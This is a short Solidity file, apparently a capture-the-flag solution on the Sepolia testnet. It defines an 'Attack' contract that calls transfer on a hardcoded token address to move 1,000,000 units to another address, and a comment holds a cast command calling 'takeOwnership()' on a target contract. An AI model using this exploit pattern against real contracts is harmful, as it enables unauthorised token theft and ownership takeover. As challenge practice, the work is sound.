// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IToken {
    function totalSupply() external returns (uint256);

    function transfer(address, uint) external returns (bool);

    function balanceOf(address) external view returns (uint);
}

contract Attack {
    IToken public token;

    constructor() {
        token = IToken(0xC2e6f7674C9a99E19F97a63B6E62eC91A771fF13);
    }

    function transferToken() external {
        token.transfer(0x0b9e2F440a82148BFDdb25BEA451016fB94A3F02, 1000000);
    }
}

// contract Attack 0x5731830e705Da7C8eA1953C30d4135037472BAe2

// cast call 0x9f8379AC3429bCE93470151EBB22F06c3B81EAfa "takeOwnership()" --rpc-url $SEPOLIA_RPC_URL
